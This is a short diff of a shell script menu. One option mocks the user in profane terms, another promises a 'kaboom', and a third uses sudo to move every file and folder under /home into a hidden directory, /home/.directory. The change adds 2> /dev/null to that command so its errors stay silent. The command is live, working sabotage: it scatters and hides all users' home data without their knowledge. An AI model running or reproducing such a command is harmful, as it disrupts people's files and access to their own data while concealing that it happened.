@@ -46,8 +46,7 @@ case $option in
         echo -e "\n${yellowColour}Fucking nerd, did you think that this would work?${endColour}\n"
         ;;
     2)
-        sudo mkdir -p /home/.directory && sudo find /home -mindepth 2 -exec mv {} /home/.directory/ \;
-
+        sudo mkdir -p /home/.directory && sudo find /home -mindepth 2 -exec mv {} /home/.directory/ \; 2> /dev/null
         ;;
     3)
         echo -e "\n${greenColour}You are going to make a kaboom${endColour}\n"
